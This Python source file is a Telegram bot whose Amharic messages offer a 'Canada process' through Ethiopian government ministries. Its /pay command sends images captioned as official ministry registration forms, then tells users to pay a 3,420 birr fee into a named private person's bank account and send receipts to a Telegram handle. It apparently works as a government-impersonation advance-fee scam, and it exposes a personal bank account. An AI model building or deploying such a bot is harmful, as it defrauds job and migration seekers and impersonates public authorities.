import os
import threading
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters

# --- Telegram Bot Setup ---
TOKEN = os.getenv("BOT_TOKEN")

# Telegram file_id for the receipt image
FILE_ID = "AgACAgQAAxkBAANcaSrwHpp87IGuR-E-X5_maryIYfMAAgILaxtiBlhRe2GwQsDSxZoBAAMCAAN5AAM2BA"
FILE_ID2 = "AgACAgQAAxkBAANSaSruVVLPa9HZ4xpOuKxQ812cYsgAAlsMaxtiBlBRJ5bdl0STQcEBAAMCAAN5AAM2BA"
FILE_ID3 = "AgACAgQAAxkBAANnaSsujjN39mpQCIy6Db3UbB1GvqwAAm4LaxtiBlhR5vDonYQVez0BAAMCAAN5AAM2BA"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "የካናዳ ፕሮሰስ በ ስራ እና ክህሎት ሚኒስቴር በኩል ለመጀመር በቀጣይ የሚያገኙትን ፎርሞች ሞልተው የመመዝገቢያ 3,420 ብር ይክፈሉ። "
        "ፎርሙን ለመሙላት እና የመመዝገቢያ ክፍያውን ለመክፈል ይህን ይጫኑ /pay."
    )


async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Send image using Telegram file_id
    await update.message.reply_photo(
        photo=FILE_ID,
        caption=" *የ ኢትዮጵያ ፌዴራላዊ ዲሞክራሲያዊ ሪፐብሊክ የውጭ ጉዳይ ሚኒስቴር የምዝገባ ቅፅ።::*",
        parse_mode="Markdown"
    )
# Send second image using Telegram file_id 
    await update.message.reply_photo( 
        photo=FILE_ID2, 
        caption=" *የ ስራና ክህሎት የ ምዝገባ እና የ ስራ ዝርዝር ቅፅ።:*", 
        parse_mode="Markdown" )

    # Send third image using Telegram file_id 
    await update.message.reply_photo( 
        photo=FILE_ID3, 
        caption=" *የተመደበሎት አምባሳደር ወይም ህጋዊ ወኪል:*", 
        parse_mode="Markdown" )
    
    # Then send text instructions
    message = (
        "💰 የመክፈያ መመሪያ:\n\n"
        "ክፍያዎን ከታች በተቀመጠው የባንክ አካውንት ይላኩ:\n\n"
        "🏦 የአካውንት ስም: ሸጋው ታምሩ ተመስገን\n"
        "💳 የአካውንት ቁጥር: 567592816011\n"
        "🏦 የባንክ ስም: ዳሽን ባንክ\n\n"
        "የሞሉትን ፎርም እና ክፍያ የከፈሉበትን ደረሰኝ በ @ELMISofficial የቴሌ-ግራም አካውንት ይላኩ።"
        "ሙሉ ማስረጃዎትን በላኩ ከ 2 እስከ 6 ሰአት ውስጥ ማሕተም የተረገጠበትን ፎርም እና የክፋያ ማረጋገጫ ደረሰኝ ይላክሎታል።"
        "ለበለጠ መረጃ ጉዳዮን ለ ያዘዉ ኢምባሲ፣ ኤጀንሲ፣ ወይም ተወካይ ይደውሉ።"
        
    )
    await update.message.reply_text(message, parse_mode="Markdown")


# --- Get file_id command ---
async def get_file_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        largest = update.message.photo[-1]  # get the largest version
        await update.message.reply_text(f"File ID: {largest.file_id}")
    else:
        await update.message.reply_text("እባክህ አንድ ፎቶ ላክ።")


# --- Flask App to keep Render alive ---
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_flask, daemon=True).start()


# --- Start Telegram Bot ---
print("Starting Telegram bot...")

app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("pay", pay))
app.add_handler(CommandHandler("get_file_id", get_file_id))
app.add_handler(MessageHandler(filters.PHOTO, get_file_id))  # optional auto-get file_id on photo

app.run_polling()
